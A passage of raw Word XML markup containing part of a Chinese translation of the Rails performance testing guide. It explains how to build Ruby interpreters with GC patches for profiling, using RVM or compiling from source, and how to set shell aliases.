          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vMerge/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="59074D3F" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="082B47ED" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Profiling </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7F7300FF" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>[:wall_time]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="79FA35C9" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>[:flat, :graph]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6B586C28" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">你现在可能已经意识到了， metrics 和 formats 用的是一个 符号数组，装的是他们 </w:t>
      </w:r>
      <w:hyperlink r:id="rId826" w:anchor="method-i-underscore" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>被下划线</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> 的名字。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A3A2CB9" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>1.7 性能测试环境</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64D28827" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">为了在 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>MRI</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 解释器下的 Rails 性能测试中得到最佳效果。你可能需要建立一些特别配置的 Ruby 二进制解释器。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BBE1CED" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>比较推荐的MRI版本和补丁：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971"/>
      </w:tblGrid>
      <w:tr w:rsidR="004F7237" w14:paraId="4D7E656B" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4768AB5B" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Version</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="15829442" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Patch</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004F7237" w14:paraId="18594FD6" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0505919E" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>1.8.6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="41B00269" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>ruby186gc</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004F7237" w14:paraId="4C840B1E" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3558887A" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>1.8.7</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="207891F4" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>ruby187gc</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004F7237" w14:paraId="054B178D" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="00AB50B3" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>1.9.2 and above</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="47438B7D" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>gcdata</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2CD332B2" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">他们可以在各自 “RVM” 的 </w:t>
      </w:r>
      <w:hyperlink r:id="rId827" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>_补丁_目录</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> 下中的特殊解释器版本中被找到。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D4CB287" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">你可以直接用 </w:t>
      </w:r>
      <w:hyperlink r:id="rId828" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="caps"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>RVM</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> 来安装他们或者自己从源程序编译出来，当然后者会比较费劲一点。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4269B30B" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.7.1 安装与使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>RVM</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C068A34" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果你已经装上了 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>RVM</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 的话，对你的 Ruby 解释器打一个补丁就很容易了 ，你只要为 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>RVM</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 指名一个要打上的补丁版本，其他的事情 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>RVM</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 会帮你搞定。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="004F7237" w14:paraId="6034C2E7" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="51F0EB98" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ rvm install 1.9.2-p180 --patch gcdata</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="228B060E" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ rvm install 1.8.7 --patch ruby187gc</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A7406C6" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ rvm install 1.9.2-p180 --patch ~/Downloads/downloaded_gcdata_patch.patch</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6326041D" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>只要这样就搞定了!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4478B177" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>1.7.2 从源代码安装</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="653CEF68" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>这个办法会相对复杂一点，不过也别怕，如果你从未编译过一个二进制的 Ruby 解释器，按照下面的这几个步骤就可以在你的家目录里编译安装一个 Ruby 了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DB94611" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.7.2.1 </w:t>
      </w:r>
      <w:r>
        <w:t>下载和解压缩</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6991"/>
      </w:tblGrid>
      <w:tr w:rsidR="004F7237" w14:paraId="1683D5CB" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="77C1D97B" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ mkdir rubygc</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="62C145AF" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t xml:space="preserve">$ wget &lt;the version you want from </w:t>
            </w:r>
            <w:hyperlink r:id="rId829" w:history="1">
              <w:r>
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>ftp://ftp.ruby-lang.org/pub/ruby</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B9B2A1C" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ tar -xzvf &lt;ruby-version.tar.gz&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7AAB3E59" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ cd &lt;ruby-version&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5AAD9128" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.7.2.2 </w:t>
      </w:r>
      <w:r>
        <w:t>打上补丁</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="004F7237" w14:paraId="6C171289" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4FA67F27" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t xml:space="preserve">$ curl </w:t>
            </w:r>
            <w:hyperlink r:id="rId830" w:history="1">
              <w:r>
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>http://github.com/wayneeseguin/rvm/raw/master/patches/ruby/1.9.2/p180/gcdata.patch</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t xml:space="preserve"> | patch -p0 # if you're on 1.9.2!</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4168C9EB" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t xml:space="preserve">$ curl </w:t>
            </w:r>
            <w:hyperlink r:id="rId831" w:history="1">
              <w:r>
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>http://github.com/wayneeseguin/rvm/raw/master/patches/ruby/1.8.7/ruby187gc.patch</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t xml:space="preserve"> | patch -p0 # if you're on 1.8.7!</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4C2F0DA0" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.7.2.3 </w:t>
      </w:r>
      <w:r>
        <w:t>设置并安装</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="442A96B4" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">之后的步骤会在你的家目录下的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>/rubygc</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 目录中编译并安装上一个 Ruby。你学要把下面的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>&lt;homedir&gt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 换成你的家目录的完整路径。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4800"/>
      </w:tblGrid>
      <w:tr w:rsidR="004F7237" w14:paraId="5978AEC8" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="30E46097" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ ./configure --prefix=/&lt;homedir&gt;/rubygc</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="445A5B98" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ make &amp;&amp; make install</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="05D62353" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.7.2.4 </w:t>
      </w:r>
      <w:r>
        <w:t>设置别名（</w:t>
      </w:r>
      <w:r>
        <w:t>Aliases</w:t>
      </w:r>
      <w:r>
        <w:t>）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0315D384" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">为了方便，将这些别名设置命令加入到你的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>~/.profile</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 里:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4080"/>
      </w:tblGrid>
      <w:tr w:rsidR="004F7237" w14:paraId="675A61BF" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="77601071" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>alias gcruby='~/rubygc/bin/ruby'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3B63C6AD" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>alias gcrake='~/rubygc/bin/rake'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7DC99C8E" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>alias gcgem='~/rubygc/bin/gem'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3A87FF41" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>alias gcirb='~/rubygc/bin/irb'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E582A45" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>alias gcrails='~/rubygc/bin/rails'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1164BD92" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
